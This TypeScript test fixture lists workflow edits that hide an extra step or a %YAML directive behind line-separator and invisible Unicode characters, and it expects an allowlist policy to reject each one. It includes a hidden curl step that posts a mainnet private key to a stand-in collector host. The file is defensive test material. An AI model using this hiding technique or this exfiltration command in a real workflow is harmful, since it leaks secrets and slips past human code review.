/**
 * Mainnet E2E workflow edits that hide content behind characters the policy's
 * YAML parser and GitHub's runner split lines on differently, or that read
 * differently from what runs. Each must fail on the character allowlist;
 * the controls use only allowed characters and must still pass.
 */

/** A whole-file edit and the code point its failure must name. */
export type CharacterEdit = {
  readonly label: string;
  /** Text placed before the file. */
  readonly prefix: string;
  /** Text inserted before `anchor`, or "" for none. */
  readonly insert: string;
  readonly codePoint: string;
};

/** Anchor that hidden content is inserted before: the secrets step in `execute`. */
export const ANCHOR = "      - name: Check and mask mainnet secrets\n";

const SEPARATORS = [
  ["bare CR", "\r", "U+000D"],
  ["U+0085", "\u0085", "U+0085"],
  ["U+2028", " ", "U+2028"],
  ["U+2029", " ", "U+2029"],
] as const;

/** Each separator hiding a step, then hiding a directive; then other refused characters. */
export const CHARACTER_EDITS: readonly CharacterEdit[] = [
  ...SEPARATORS.flatMap(([name, character, codePoint]): CharacterEdit[] => [
    {
      label: `${name} hides an extra execute step in a comment`,
      prefix: "",
      insert: `      # reviewed${character}      - run: curl -d "$MAINNET_E2E_PRIVATE_KEY" https://collector.example\n`,
      codePoint,
    },
    {
      label: `${name} hides a %YAML 1.1 directive in a comment`,
      prefix: `# reviewed${character}%YAML 1.1\n---\n`,
      insert: "",
      codePoint,
    },
  ]),
  { label: "U+200B in a comment", prefix: "", insert: "      # x​y\n", codePoint: "U+200B" },
  { label: "U+202E in a comment", prefix: "", insert: "      # x‮y\n", codePoint: "U+202E" },
  { label: "tab in a comment", prefix: "", insert: "      #\treviewed\n", codePoint: "U+0009" },
  { label: "NBSP in a comment", prefix: "", insert: "      # x y\n", codePoint: "U+00A0" },
];

/** Spellings with only allowed characters, which must still pass. */
export const CHARACTER_CONTROLS: readonly Omit<CharacterEdit, "codePoint">[] = [
  { label: "leading BOM", prefix: "﻿", insert: "" },
  { label: "em dash in a comment", prefix: "", insert: "      # reviewed — no change\n" },
  {
    label: "% in a comment",
    prefix: "# 100% reviewed; %YAML is refused\n",
    insert: "      # %YAML 1.1 is not used\n",
  },
];
